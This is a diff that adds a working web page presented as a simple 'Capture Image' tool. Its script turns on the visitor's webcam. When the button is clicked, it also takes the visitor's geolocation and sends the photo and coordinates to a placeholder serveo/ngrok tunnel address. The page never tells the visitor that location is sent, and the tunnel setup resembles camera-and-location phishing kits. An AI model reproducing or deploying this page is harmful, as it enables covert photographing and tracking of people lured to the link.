@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webcam Capture</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        video, canvas {
+            border: 2px solid #333;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            transition-duration: 0.4s;
+            cursor: pointer;
+            border-radius: 12px;
+        }
+
+        button:hover {
+            background-color: white;
+            color: black;
+            border: 2px solid #4CAF50;
+        }
+        
+        #loader {
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid #3498db;
+            width: 120px;
+            height: 120px;
+            -webkit-animation: spin 2s linear infinite;
+            animation: spin 2s linear infinite;
+            display: none;
+        }
+        
+        @-webkit-keyframes spin {
+            0% { -webkit-transform: rotate(0deg); }
+            100% { -webkit-transform: rotate(360deg); }
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <h1>Capture Image</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <button id="snap">Snap Photo</button>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <div id="loader"></div>
+    <script>
+        // Akses kamera
+        const video = document.getElementById('video');
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            });
+
+        // Ambil gambar dan kirim ke server
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const snap = document.getElementById('snap');
+        const loader = document.getElementById('loader');
+
+        snap.addEventListener('click', () => {
+            context.drawImage(video, 0, 0, 640, 480);
+            const dataURL = canvas.toDataURL('image/png');
+            
+            loader.style.display = 'block';
+
+            // Ambil lokasi pengguna
+            navigator.geolocation.getCurrentPosition(position => {
+                const { latitude, longitude } = position.coords;
+
+                // Kirim gambar dan lokasi ke server
+                fetch('https://<username>.serveo.net/upload', {  // Ganti dengan URL ngrok/serveo
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ image: dataURL, location: { latitude, longitude } })
+                }).then(response => response.json())
+                  .then(data => {
+                      loader.style.display = 'none';
+                      console.log('Success:', data);
+                  }).catch((error) => {
+                      loader.style.display = 'none';
+                      console.error('Error:', error);
+                  });
+            });
+        });
+    </script>
+</body>
+</html>
